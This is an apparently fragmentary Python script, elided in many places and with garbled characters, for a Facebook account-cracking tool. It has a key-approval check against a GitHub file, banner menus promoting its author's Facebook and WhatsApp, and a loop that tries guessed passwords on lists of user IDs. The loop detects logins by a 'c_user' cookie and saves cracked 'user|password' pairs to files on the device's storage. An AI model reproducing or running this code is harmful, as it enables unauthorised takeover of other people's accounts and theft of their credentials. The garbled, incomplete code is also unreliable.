...
def main_apv():
    ...
    try:
        ...
        os.system("xdg-open https://wa.me/+8801408479204")
 
        
 
    r1=requests.get("https://github.com/Alfe-sanny/WORKING-22/blob/main/Approval.txt").text
    ...
    if key1 in r1:
        ...
        print ("���������������������������������������")
        print ("             \033[1;94mGIVE ME TOOLS FOR APROVAL RASEL")     
...
\33[1;31m�� ���� �� ������� �� ���� �� ������� 
\33[1;31m��  ��  �� ��   �� ��  ��  �� ��   �� 
\33[1;31m��      �� ��   �� ��      �� ��   �� \033[1;32m ALFE\033[1;37m 
             
\x1b[36;5;46m______________________________________________________
 ...
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m TOOLS     :    OLD RANDOM FIRE
...
def R():
			...
			print(logo)
			print ("���������������������������������������")
			print("\033[1;93m{1}\033[1;92m âžŸ \033[1;95mSTART FILE CLONING  : BST METHODðŸ”¥")
			
			print("\033[1;93m{5}\033[1;97m âžŸ \033[1;91mFOLLEW MY FACEBOOK  ACCOUND : ðŸ˜½")
			print ('\033[1;92mà¼„â€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢à¼„')
			key = input(" [*] Choose : ")
			print ("���������������������������������������")
			if key in [""]:
				...
				os.system("xdg-open https://www.facebook.com/ALFE.ARIFIN?mibextid=ZbWKwL")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[UNKNOWN-MMH]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ALFE-OK ðŸŒº] {user} | {pw}")
 
                    wrt = '%s|%s' % (user,pw)
 
                    ok.append(wrt)
 
                    open('/sdcard/ALFE_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/RAJ_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        print(' [M] Crack With Name Digit Pass')
        ...
        if chi == '':
            ...
            print("\033[1;32m      Dont Forget  YOU LUCK CUACKhðŸ˜Š \033[1;37m")
...
def yt():
	logo()
	os.system("xdg-open https://www.facebook.com/ALFE.ARIFIN")
	time.sleep(3)
	R()
